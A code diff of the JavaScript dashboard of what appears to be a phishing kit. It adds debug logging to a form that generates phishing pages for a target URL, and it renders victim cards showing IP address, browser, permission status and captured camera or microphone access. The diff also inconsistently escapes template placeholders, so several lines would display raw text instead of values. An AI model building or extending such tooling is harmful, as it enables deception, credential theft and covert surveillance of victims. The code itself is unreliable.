@@ -1,51 +1,68 @@
 document.addEventListener('DOMContentLoaded', function() {
+    console.log("🟢 Dashboard JS Loaded!"); // <-- DEBUG 1
+    
     const socket = io();
     
     // Create form submission
-    document.getElementById('create-form').addEventListener('submit', function(e) {
-        e.preventDefault();
-        
-        const targetUrl = document.getElementById('target-url').value;
-        const btn = this.querySelector('button[type="submit"]');
-        const originalText = btn.textContent;
-        
-        btn.textContent = 'Creating...';
-        btn.disabled = true;
-        
-        const formData = new FormData();
-        formData.append('target_url', targetUrl);
+    const createForm = document.getElementById('create-form');
+    console.log("🔍 Form found:", createForm); // <-- DEBUG 2
 
-        fetch('/create', {
-            method: 'POST',
-            body: formData
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.success) {
-                document.getElementById('result-url').value = window.location.origin + data.url;
-                document.getElementById('result-container').classList.remove('d-none');
-                document.getElementById('placeholder').classList.add('d-none');
-                
-                showNotification('Phishing page created successfully!', 'success');
-                
-                // Focus the input field
-                document.getElementById('result-url').focus();
-                document.getElementById('result-url').select();
-            } else {
-                showNotification('Error: ' + data.error, 'danger');
+    if (createForm) {
+        createForm.addEventListener('submit', function(e) {
+            console.log("✅ Form submitted!"); // <-- DEBUG 3
+            e.preventDefault();
+            
+            const targetUrl = document.getElementById('target-url').value;
+            console.log("🔍 Target URL from input:", targetUrl); // <-- DEBUG 4
+            
+            const btn = this.querySelector('button[type="submit"]');
+            const originalText = btn.textContent;
+            
+            btn.textContent = 'Creating...';
+            btn.disabled = true;
+            
+            const formData = new FormData();
+            formData.append('target_url', targetUrl);
+
+            fetch('/create', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                console.log("📡 Received response from server, status:", response.status); // <-- DEBUG 5
+                return response.json();
+            })
+            .then(data => {
+                console.log("📡 Response JSON from server:", data); // <-- DEBUG 6
+                if (data.success) {
+                    document.getElementById('result-url').value = window.location.origin + data.url;
+                    document.getElementById('result-container').classList.remove('d-none');
+                    document.getElementById('placeholder').classList.add('d-none');
+                    
+                    showNotification('Phishing page created successfully!', 'success');
+                    
+                    // Focus the input field
+                    document.getElementById('result-url').focus();
+                    document.getElementById('result-url').select();
+                } else {
+                    console.error("🔥 Server returned an error:", data.error); // <-- DEBUG 7
+                    showNotification('Error: ' + data.error, 'danger');
+                    document.getElementById('placeholder').classList.remove('d-none');
+                }
+            })
+            .catch(error => {
+                console.error('🔥 Fetch error:', error); // <-- DEBUG 8
+                showNotification('Connection error. Check console.', 'danger');
                 document.getElementById('placeholder').classList.remove('d-none');
-            }
-        })
-        .catch(error => {
-            console.error('Fetch error:', error);
-            showNotification('Connection error. Check console.', 'danger');
-            document.getElementById('placeholder').classList.remove('d-none');
-        })
-        .finally(() => {
-            btn.textContent = originalText;
-            btn.disabled = false;
+            })
+            .finally(() => {
+                btn.textContent = originalText;
+                btn.disabled = false;
+            });
         });
-    });
+    } else {
+        console.error("❌ ERROR: Form with ID 'create-form' not found!"); // <-- DEBUG 9
+    }
     
     // Copy URL functionality
     document.getElementById('copy-btn')?.addEventListener('click', function() {
@@ -101,7 +118,7 @@ function showNotification(message, type) {
     const alertDiv = document.createElement('div');
     alertDiv.className = `alert alert-${type} alert-dismissible fade show`;
     alertDiv.innerHTML = `
-        ${message}
+        \${message}
         <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
     `;
     
@@ -138,20 +155,20 @@ function addVictimCard(data) {
         <div class="card-body">
             <div class="row">
                 <div class="col-md-6">
-                    <p><strong>Campaign ID:</strong> ${data.campaign_id}</p>
-                    <p><strong>IP Address:</strong> ${data.ip || 'Unknown'}</p>
-                    <p><strong>Browser:</strong> ${data.user_agent || 'Unknown'}</p>
+                    <p><strong>Campaign ID:</strong> \${data.campaign_id}</p>
+                    <p><strong>IP Address:</strong> \${data.ip || 'Unknown'}</p>
+                    <p><strong>Browser:</strong> \${data.user_agent || 'Unknown'}</p>
                 </div>
                 <div class="col-md-6">
-                    <p><strong>Last Action:</strong> ${data.action || 'Unknown'}</p>
-                    <p><strong>Timestamp:</strong> ${new Date(data.timestamp).toLocaleString()}</p>
-                    <p><strong>Permission:</strong> <span id="permission-${data.campaign_id}">Pending</span></p>
-                    <p><strong>Media Access:</strong> <span id="media-${data.campaign_id}">Not Requested</span></p>
+                    <p><strong>Last Action:</strong> \${data.action || 'Unknown'}</p>
+                    <p><strong>Timestamp:</strong> \${new Date(data.timestamp).toLocaleString()}</p>
+                    <p><strong>Permission:</strong> <span id="permission-\${data.campaign_id}">Pending</span></p>
+                    <p><strong>Media Access:</strong> <span id="media-\${data.campaign_id}">Not Requested</span></p>
                 </div>
             </div>
             <div class="mt-3">
                 <h6>Activity Log:</h6>
-                <div id="activity-log-${data.campaign_id}" class="activity-log">
+                <div id="activity-log-\${data.campaign_id}" class="activity-log">
                     <div class="activity-item">${data.action || 'Page loaded'} - ${new Date(data.timestamp).toLocaleString()}</div>
                 </div>
             </div>
@@ -189,7 +206,7 @@ function showMediaAccessAlert(data) {
     // Create a modal to show the media stream
     const modal = document.createElement('div');
     modal.className = 'modal fade';
-    modal.id = `media-modal-${data.campaign_id}`;
+    modal.id = `media-modal-\${data.campaign_id}`;
     modal.innerHTML = `
         <div class="modal-dialog">
             <div class="modal-content">
